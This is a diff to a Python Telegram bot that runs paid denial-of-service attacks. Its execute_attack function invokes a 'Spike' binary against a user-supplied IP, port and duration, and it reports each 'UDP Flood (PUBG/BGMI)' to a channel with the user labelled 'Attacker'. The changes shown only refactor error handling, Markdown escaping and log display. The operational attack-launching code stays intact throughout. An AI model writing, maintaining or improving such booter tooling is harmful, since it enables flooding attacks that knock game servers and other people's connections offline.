@@ -341,106 +341,66 @@ def bgmi_command(message):
         attack_in_progress = False
 
 async def execute_attack(ip, port, duration, user_id):
-    """Execute attack using Spike binary with specified parameters"""
+    """Execute attack using Spike binary with proper error handling and messaging"""
     try:
         # Get absolute path to binary
         script_dir = os.path.dirname(os.path.abspath(__file__))
         binary_path = os.path.join(script_dir, "Spike")
         
-        # Validate binary exists and is executable
+        # Validate binary
         if not os.path.exists(binary_path):
-            raise Exception("Attack binary 'Spike' not found in bot directory")
-        
+            raise FileNotFoundError("Attack binary 'Spike' not found")
         if not os.access(binary_path, os.X_OK):
-            raise Exception("Attack binary 'Spike' is not executable (run: chmod +x Spike)")
+            raise PermissionError("Attack binary not executable (run: chmod +x Spike)")
 
-        # Prepare the attack command
+        # Prepare command
         cmd = f"{binary_path} {ip} {port} {duration} 12 750"
-        
-        # Debug logging
-        log_action("ATTACK_LAUNCH", user_id, f"Command: {cmd}")
+        log_action("ATTACK_START", user_id, f"{ip}:{port} for {duration}s")
 
-        # Create subprocess
+        # Execute attack
         proc = await asyncio.create_subprocess_shell(
             cmd,
             stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            shell=True
+            stderr=asyncio.subprocess.PIPE
         )
 
-        # Wait for completion with timeout
         try:
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 30)
-            
             if proc.returncode != 0:
-                error_output = stderr.decode().strip() if stderr else "No error output"
-                raise Exception(f"Attack failed with code {proc.returncode}. Error: {error_output}")
-
+                error_msg = stderr.decode().strip()[:300] if stderr else "Unknown error"
+                raise RuntimeError(f"Attack failed with code {proc.returncode}: {error_msg}")
         except asyncio.TimeoutError:
             proc.terminate()
             await proc.wait()
-            raise Exception(f"Attack timed out after {duration + 30} seconds")
+            raise TimeoutError(f"Attack timed out after {duration + 30}s")
 
-        # Escape special characters for Markdown
-        def escape_markdown(text):
-            return re.sub(r'([_*\[\]()~`>#+-=|{}.!])', r'\\\1', str(text))
-
-        # Successful attack message
+        # Send success message (non-await version)
         success_msg = f"""
-🚀 *Attack Successfully Completed*
+✅ *Attack Successful* ✅
 
-🎯 *Target:* `{escape_markdown(ip)}:{escape_markdown(port)}`
-⏱️ *Duration:* {escape_markdown(duration)} seconds
-👤 *Attacker ID:* `{escape_markdown(user_id)}`
-⚡ *Method:* UDP Flood (PUBG/BGMI)
-        """
-        
-        # Send success message
-        try:
-            await bot.send_message(
-                CHANNEL_ID,
-                success_msg,
-                parse_mode='MarkdownV2'
-            )
-        except Exception as e:
-            logging.error(f"Failed to send success message: {e}")
-            await bot.send_message(
-                CHANNEL_ID,
-                "✅ Attack completed successfully!",
-                parse_mode=None
-            )
-
-        log_action("ATTACK_SUCCESS", user_id, f"{ip}:{port} for {duration}s")
+• Target: `{escape_markdown(ip)}:{escape_markdown(port)}`
+• Duration: {escape_markdown(duration)}s
+• Attacker: `{escape_markdown(user_id)}`
+• Method: UDP Flood (PUBG/BGMI)
+"""
+        bot.send_message(CHANNEL_ID, success_msg, parse_mode='MarkdownV2')
+        log_action("ATTACK_SUCCESS", user_id, f"{ip}:{port} {duration}s")
 
     except Exception as e:
-        # Error message
         error_msg = f"""
-❌ *Attack Failed*
+❌ *Attack Failed* ❌
 
-🎯 *Target:* `{ip}:{port}`
-⏱️ *Duration:* {duration}s
-💥 *Error:* {str(e)[:300]}...
-
-Contact @Titanop24 for support
-        """
-        
-        # Send error message
-        try:
-            await bot.send_message(
-                CHANNEL_ID,
-                error_msg,
-                parse_mode='MarkdownV2'
-            )
-        except Exception as msg_error:
-            logging.error(f"Failed to send error message: {msg_error}")
-            await bot.send_message(
-                CHANNEL_ID,
-                f"❌ Attack failed: {str(e)[:300]}...",
-                parse_mode=None
-            )
-
+• Target: `{escape_markdown(ip)}:{escape_markdown(port)}`
+• Error: {escape_markdown(str(e))}
+"""
+        bot.send_message(CHANNEL_ID, error_msg, parse_mode='MarkdownV2')
         log_action("ATTACK_FAILED", user_id, f"{ip}:{port} - {str(e)}")
         raise
+
+def escape_markdown(text):
+    """Escape special MarkdownV2 characters"""
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 
 @bot.message_handler(commands=['add_coin'])
 def add_coin_command(message):
@@ -594,42 +554,42 @@ def list_users(message):
 def show_logs(message):
     """Show logs with proper formatting"""
     if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ Only admins can use this command!")
+        bot.reply_to(message, "❌ Admin only command!")
         return
     
     try:
-        if not os.path.exists(LOGS_FILE) or os.path.getsize(LOGS_FILE) == 0:
+        if not os.path.exists(LOGS_FILE):
             bot.reply_to(message, "📭 No logs found!")
             return
-        
+
         with open(LOGS_FILE, 'r', encoding='utf-8') as f:
-            logs = f.readlines()
-        
+            logs = f.readlines()[-50:]  # Get last 50 entries
+
         if not logs:
-            bot.reply_to(message, "📭 No logs found!")
+            bot.reply_to(message, "📭 No logs available!")
             return
-        
-        # Prepare clean log entries
-        clean_logs = []
-        for log in logs[-50:]:  # Show last 50 entries
-            # Remove any Markdown special characters
-            clean_log = re.sub(r'([_*\[\]()~`>#+-=|{}.!])', r'\\\1', log.strip())
-            clean_logs.append(clean_log)
-        
-        # Format as code block to avoid Markdown parsing issues
-        response = "📜 *Recent Logs*\n\n"
+
+        # Format logs with proper escaping
+        formatted_logs = []
+        for log in logs:
+            try:
+                timestamp, user, action, details = log.strip().split(' | ', 3)
+                formatted_logs.append(
+                    f"{timestamp} | {user} | {action} | {details}"
+                )
+            except ValueError:
+                formatted_logs.append(log.strip())
+
+        # Send as plain text to avoid Markdown issues
+        response = "📜 Recent Logs (last 50 entries)\n\n"
         response += "```\n"
-        response += "\n".join(clean_logs)
+        response += "\n".join(formatted_logs)
         response += "\n```"
         
-        # Send with parse_mode=None to avoid Markdown processing
-        bot.reply_to(message, response, parse_mode=None)
-        
+        bot.reply_to(message, response, parse_mode='MarkdownV2')
+
     except Exception as e:
-        error_msg = "❌ Error displaying logs\n\n"
-        error_msg += f"Error: {str(e)}"
-        bot.reply_to(message, error_msg, parse_mode=None)
-        logging.error(f"Logs command error: {e}")
+        bot.reply_to(message, f"❌ Error showing logs: {str(e)}", parse_mode=None)
 
 @bot.message_handler(commands=['clear_logs'])
 def clear_logs(message):
